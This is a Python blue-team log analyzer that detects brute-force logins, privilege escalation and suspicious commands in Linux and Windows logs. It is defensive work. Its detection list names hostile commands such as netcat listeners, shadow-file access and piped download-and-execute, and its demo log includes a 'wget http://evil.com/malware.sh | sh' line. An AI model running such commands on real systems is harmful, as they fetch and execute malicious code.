#!/usr/bin/env python3
"""
Log Analyzer - Blue Team Tool
A simple log parser and analyzer for detecting suspicious patterns.

Designed for Blue Team practitioners to practice log analysis.

Features:
- Parse Windows Event Logs (text format) and Linux auth logs
- Detect brute force attempts (failed logins)
- Detect privilege escalation attempts
- Detect suspicious IP addresses
- Generate summary reports

Usage:
    python log_analyzer.py <logfile> [--output report.txt]
    python log_analyzer.py --demo
"""

import re
import argparse
import sys
from collections import Counter, defaultdict
from datetime import datetime


# --- Pattern Definitions ---

# Failed login patterns (Windows and Linux)
FAILED_LOGIN_PATTERNS = [
    r"Failed password for .+ from (\d+\.\d+\.\d+\.\d+)",  # Linux SSH
    r"authentication failure.*rhost=(\S+)",                  # Linux PAM
    r"Logon Failure.*Account Name:\s+(\S+)",                 # Windows
    r"EventID 4625.*Source Network Address:\s+(\d+\.\d+\.\d+\.\d+)",  # Windows 4625
    r"failed login.*from (\d+\.\d+\.\d+\.\d+)",            # Generic
]

# Successful login patterns
SUCCESS_LOGIN_PATTERNS = [
    r"Accepted .+ for .+ from (\d+\.\d+\.\d+\.\d+)",       # Linux SSH
    r"Session opened for user",                              # Linux PAM
    r"EventID 4624.*Source Network Address:\s+(\d+\.\d+\.\d+\.\d+)",  # Windows 4624
    r"successful login.*from (\d+\.\d+\.\d+\.\d+)",        # Generic
]

# Privilege escalation patterns
PRIV_ESCALATION_PATTERNS = [
    r"sudo:.+COMMAND=",                                      # Linux sudo
    r"privilege escalation",                                 # Generic
    r"EventID 4672",                                         # Windows special privileges
    r"su:.*session opened for user root",                    # Linux su to root
]

# Suspicious patterns
SUSPICIOUS_PATTERNS = [
    (r"rm\s+-rf\s+/", "Potential destructive command"),
    (r"chmod\s+[0-7]*777", "Overly permissive file permissions"),
    (r"nc\s+-[elp]", "Netcat listener detected"),
    (r"/etc/shadow", "Shadow file access attempt"),
    (r"wget\s+.*\|.*sh", "Download and execute pattern"),
    (r"curl\s+.*\|.*bash", "Download and execute pattern"),
    (r"reverse shell", "Reverse shell keyword detected"),
    (r"powershell.*-enc", "Encoded PowerShell command"),
]


class LogAnalyzer:
    """Analyzes log files for suspicious security events."""

    def __init__(self):
        self.failed_logins = []
        self.success_logins = []
        self.priv_escalations = []
        self.suspicious_events = []
        self.failed_login_ips = Counter()
        self.success_login_ips = Counter()
        self.total_lines = 0
        self.parse_errors = 0

    def parse_line(self, line):
        """Parse a single log line and check for security events."""
        self.total_lines += 1
        line_stripped = line.strip()

        if not line_stripped:
            return

        # Check failed logins
        for pattern in FAILED_LOGIN_PATTERNS:
            match = re.search(pattern, line_stripped, re.IGNORECASE)
            if match:
                ip = match.group(1) if match.lastindex else "unknown"
                self.failed_logins.append(line_stripped)
                self.failed_login_ips[ip] += 1
                return

        # Check successful logins
        for pattern in SUCCESS_LOGIN_PATTERNS:
            match = re.search(pattern, line_stripped, re.IGNORECASE)
            if match:
                ip = match.group(1) if match.lastindex else "unknown"
                self.success_logins.append(line_stripped)
                self.success_login_ips[ip] += 1
                return

        # Check privilege escalation
        for pattern in PRIV_ESCALATION_PATTERNS:
            if re.search(pattern, line_stripped, re.IGNORECASE):
                self.priv_escalations.append(line_stripped)
                return

        # Check suspicious patterns
        for pattern, description in SUSPICIOUS_PATTERNS:
            if re.search(pattern, line_stripped, re.IGNORECASE):
                self.suspicious_events.append({
                    "line": line_stripped,
                    "description": description,
                })
                return

    def analyze_file(self, filepath):
        """Analyze an entire log file."""
        try:
            with open(filepath, "r", encoding="utf-8", errors="replace") as f:
                for line in f:
                    self.parse_line(line)
        except FileNotFoundError:
            print(f"[ERROR] File not found: {filepath}")
            sys.exit(1)
        except PermissionError:
            print(f"[ERROR] Permission denied: {filepath}")
            sys.exit(1)

    def get_brute_force_ips(self, threshold=5):
        """Return IPs with failed logins above the threshold."""
        return {ip: count for ip, count in self.failed_login_ips.items()
                if count >= threshold}

    def generate_report(self):
        """Generate a human-readable security report."""
        report = []
        report.append("=" * 60)
        report.append("  LOG ANALYSIS SECURITY REPORT")
        report.append(f"  Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        report.append("=" * 60)
        report.append("")

        # Summary
        report.append("[SUMMARY]")
        report.append(f"  Total lines analyzed:    {self.total_lines}")
        report.append(f"  Failed login attempts:   {len(self.failed_logins)}")
        report.append(f"  Successful logins:       {len(self.success_logins)}")
        report.append(f"  Privilege escalations:   {len(self.priv_escalations)}")
        report.append(f"  Suspicious events:       {len(self.suspicious_events)}")
        report.append("")

        # Brute force detection
        brute_force = self.get_brute_force_ips()
        if brute_force:
            report.append("[!] BRUTE FORCE DETECTED")
            report.append(f"  IPs with 5+ failed attempts:")
            for ip, count in sorted(brute_force.items(), key=lambda x: x[1], reverse=True):
                report.append(f"    - {ip}: {count} attempts")
            report.append("")

        # Top failed login IPs
        if self.failed_login_ips:
            report.append("[TOP FAILED LOGIN SOURCES]")
            for ip, count in self.failed_login_ips.most_common(10):
                report.append(f"  {ip:>20}: {count} attempts")
            report.append("")

        # Top successful login IPs
        if self.success_login_ips:
            report.append("[TOP SUCCESSFUL LOGIN SOURCES]")
            for ip, count in self.success_login_ips.most_common(10):
                report.append(f"  {ip:>20}: {count} logins")
            report.append("")

        # Privilege escalation events
        if self.priv_escalations:
            report.append("[PRIVILEGE ESCALATION EVENTS]")
            for event in self.priv_escalations[:20]:
                report.append(f"  > {event[:100]}")
            if len(self.priv_escalations) > 20:
                report.append(f"  ... and {len(self.priv_escalations) - 20} more")
            report.append("")

        # Suspicious events
        if self.suspicious_events:
            report.append("[SUSPICIOUS EVENTS]")
            for event in self.suspicious_events[:20]:
                report.append(f"  [{event['description']}]")
                report.append(f"    {event['line'][:100]}")
            if len(self.suspicious_events) > 20:
                report.append(f"  ... and {len(self.suspicious_events) - 20} more")
            report.append("")

        report.append("=" * 60)
        report.append("  END OF REPORT")
        report.append("=" * 60)

        return "\n".join(report)


def generate_demo_log():
    """Generate a sample log file for testing."""
    demo_logs = """Jan 15 08:23:01 server sshd[1234]: Failed password for admin from 192.168.1.100 port 22 ssh2
Jan 15 08:23:05 server sshd[1235]: Failed password for admin from 192.168.1.100 port 22 ssh2
Jan 15 08:23:09 server sshd[1236]: Failed password for admin from 192.168.1.100 port 22 ssh2
Jan 15 08:23:13 server sshd[1237]: Failed password for admin from 192.168.1.100 port 22 ssh2
Jan 15 08:23:17 server sshd[1238]: Failed password for admin from 192.168.1.100 port 22 ssh2
Jan 15 08:23:21 server sshd[1239]: Failed password for admin from 192.168.1.100 port 22 ssh2
Jan 15 08:23:25 server sshd[1240]: Failed password for admin from 192.168.1.100 port 22 ssh2
Jan 15 08:23:29 server sshd[1241]: Failed password for admin from 192.168.1.100 port 22 ssh2
Jan 15 08:23:33 server sshd[1242]: Failed password for admin from 192.168.1.100 port 22 ssh2
Jan 15 08:23:37 server sshd[1243]: Failed password for admin from 192.168.1.100 port 22 ssh2
Jan 15 08:24:01 server sshd[1244]: Failed password for root from 10.0.0.50 port 22 ssh2
Jan 15 08:24:05 server sshd[1245]: Failed password for root from 10.0.0.50 port 22 ssh2
Jan 15 08:24:09 server sshd[1246]: Failed password for root from 10.0.0.50 port 22 ssh2
Jan 15 08:25:00 server sshd[1247]: Accepted password for admin from 172.16.0.5 port 22 ssh2
Jan 15 08:25:01 server sshd[1248]: pam_unix(sshd:session): session opened for user admin
Jan 15 08:30:00 server sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash
Jan 15 08:35:00 server kernel: chmod 777 /etc/shadow attempted by user admin
Jan 15 08:40:00 server bash[5678]: wget http://evil.com/malware.sh | sh
Jan 15 08:45:00 server sshd[1249]: Failed password for user1 from 203.0.113.42 port 22 ssh2
Jan 15 08:45:05 server sshd[1250]: Failed password for user1 from 203.0.113.42 port 22 ssh2
Jan 15 08:45:10 server sshd[1251]: Failed password for user1 from 203.0.113.42 port 22 ssh2
Jan 15 08:45:15 server sshd[1252]: Failed password for user1 from 203.0.113.42 port 22 ssh2
Jan 15 08:45:20 server sshd[1253]: Failed password for user1 from 203.0.113.42 port 22 ssh2
Jan 15 08:45:25 server sshd[1254]: Failed password for user1 from 203.0.113.42 port 22 ssh2
Jan 15 08:45:30 server sshd[1255]: Failed password for user1 from 203.0.113.42 port 22 ssh2
Jan 15 08:50:00 server sshd[1256]: Accepted publickey for deploy from 10.0.0.1 port 22 ssh2
Jan 15 09:00:00 server sudo: deploy : TTY=pts/1 ; PWD=/opt/app ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
"""
    return demo_logs


def main():
    parser = argparse.ArgumentParser(
        description="Log Analyzer - Detect suspicious patterns in log files",
        epilog="Examples:\n"
               "  python log_analyzer.py /var/log/auth.log\n"
               "  python log_analyzer.py windows_events.log --output report.txt\n"
               "  python log_analyzer.py --demo",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("logfile", nargs="?", help="Path to the log file to analyze")
    parser.add_argument("--output", "-o", help="Save report to a file")
    parser.add_argument("--demo", action="store_true", help="Run with demo data")
    parser.add_argument("--threshold", "-t", type=int, default=5,
                        help="Failed login threshold for brute force detection (default: 5)")

    args = parser.parse_args()

    analyzer = LogAnalyzer()

    if args.demo:
        print("[*] Running in demo mode with sample log data...")
        demo_data = generate_demo_log()
        for line in demo_data.splitlines():
            analyzer.parse_line(line)
    elif args.logfile:
        print(f"[*] Analyzing: {args.logfile}")
        analyzer.analyze_file(args.logfile)
    else:
        parser.print_help()
        sys.exit(1)

    report = analyzer.generate_report()
    print(report)

    if args.output:
        with open(args.output, "w") as f:
            f.write(report)
        print(f"\n[*] Report saved to: {args.output}")


if __name__ == "__main__":
    main()
